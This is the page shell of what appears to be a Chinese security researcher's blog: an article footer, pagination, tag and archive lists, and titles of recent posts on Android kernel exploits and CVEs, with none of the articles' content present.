    <footer class="article-footer">
      <a data-url="http://blog.idhyt.com/2014/08/25/technic-lol-infinite-sight/" data-id="civbwoo78001s5p6inl11nzg3" class="article-share-link">Share</a>
      
        <a href="http://blog.idhyt.com/2014/08/25/technic-lol-infinite-sight/#disqus_thread" class="article-comment-link">留言</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/lol/">lol</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    <a class="extend prev" rel="prev" href="/page/4/">&laquo; __('prev')</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/6/">__('next') &raquo;</a>
  </nav>
</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分類</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/android/">android</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/diary/">diary</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/exploit/">exploit</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/study/">study</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/technic/">technic</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/virus/">virus</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">標籤</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/adb/">adb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/">android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/challenge/">challenge</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve/">cve</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/debug/">debug</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/english/">english</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/iovyroot/">iovyroot</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/libstagefright/">libstagefright</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lol/">lol</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nvidia/">nvidia</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pingpongroot/">pingpongroot</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pxn/">pxn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/">shellcode</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/smali/">smali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/">sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/symbol/">symbol</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/task/">task</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/thread/">thread</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/uac/">uac</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/webview/">webview</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xposed/">xposed</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/下载/">下载</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/感染/">感染</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/推广/">推广</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/无法描述/">无法描述</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/流氓/">流氓</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/淘宝客/">淘宝客</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/盗号/">盗号</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/过滤/">过滤</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/驱动/">驱动</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">標籤雲</h3>
    <div class="widget tagcloud">
      <a href="/tags/adb/" style="font-size: 10px;">adb</a> <a href="/tags/android/" style="font-size: 10px;">android</a> <a href="/tags/challenge/" style="font-size: 13.33px;">challenge</a> <a href="/tags/cve/" style="font-size: 18.33px;">cve</a> <a href="/tags/debug/" style="font-size: 10px;">debug</a> <a href="/tags/english/" style="font-size: 13.33px;">english</a> <a href="/tags/iovyroot/" style="font-size: 10px;">iovyroot</a> <a href="/tags/kernel/" style="font-size: 10px;">kernel</a> <a href="/tags/libstagefright/" style="font-size: 11.67px;">libstagefright</a> <a href="/tags/lol/" style="font-size: 10px;">lol</a> <a href="/tags/nvidia/" style="font-size: 10px;">nvidia</a> <a href="/tags/pingpongroot/" style="font-size: 10px;">pingpongroot</a> <a href="/tags/pxn/" style="font-size: 10px;">pxn</a> <a href="/tags/shellcode/" style="font-size: 10px;">shellcode</a> <a href="/tags/smali/" style="font-size: 10px;">smali</a> <a href="/tags/sql/" style="font-size: 10px;">sql</a> <a href="/tags/symbol/" style="font-size: 10px;">symbol</a> <a href="/tags/task/" style="font-size: 10px;">task</a> <a href="/tags/thread/" style="font-size: 10px;">thread</a> <a href="/tags/uac/" style="font-size: 10px;">uac</a> <a href="/tags/webview/" style="font-size: 10px;">webview</a> <a href="/tags/xposed/" style="font-size: 11.67px;">xposed</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/下载/" style="font-size: 10px;">下载</a> <a href="/tags/感染/" style="font-size: 16.67px;">感染</a> <a href="/tags/推广/" style="font-size: 10px;">推广</a> <a href="/tags/无法描述/" style="font-size: 20px;">无法描述</a> <a href="/tags/流氓/" style="font-size: 10px;">流氓</a> <a href="/tags/淘宝客/" style="font-size: 10px;">淘宝客</a> <a href="/tags/盗号/" style="font-size: 13.33px;">盗号</a> <a href="/tags/过滤/" style="font-size: 11.67px;">过滤</a> <a href="/tags/驱动/" style="font-size: 15px;">驱动</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">彙整</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">February 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">October 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">September 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">July 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/05/">May 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/04/">April 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">March 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/01/">January 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/10/">October 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/09/">September 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/08/">August 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/07/">July 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/01/">January 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/12/">December 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/11/">November 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/07/">July 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/05/">May 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/03/">March 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/01/">January 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/12/">December 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/11/">November 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/10/">October 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/07/">July 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/06/">June 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/04/">April 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/12/">December 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/07/">July 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/06/">June 2011</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/05/">May 2011</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">最新文章</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2016/11/09/exploit-kernel-security-flaws/">KERNEL SECURITY FLAWS (0day for nexus4)</a>
          </li>
        
          <li>
            <a href="/2016/10/24/exploit-cve-2016-5195/">CVE-2016-5195</a>
          </li>
        
          <li>
            <a href="/2016/09/04/exploit-perf_event-vul/">PERF_EVENT VUL</a>
          </li>
        
          <li>
            <a href="/2016/08/09/exploit-bypass-pxn/">绕过PXN保护</a>
          </li>
        
          <li>
            <a href="/2016/07/07/exploit-cve-2015-1805/">CVE-2015-1805</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2016 idhyt<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    
<script>
  var disqus_shortname = 'idhyt';
  
  (function(){
    var dsq = document.createElement('script');
    dsq.type = 'text/javascript';
    dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/count.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>


<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">
  <script src="/fancybox/jquery.fancybox.pack.js" type="text/javascript"></script>


<script src="/js/script.js" type="text/javascript"></script>

  </div>
</body>
</html>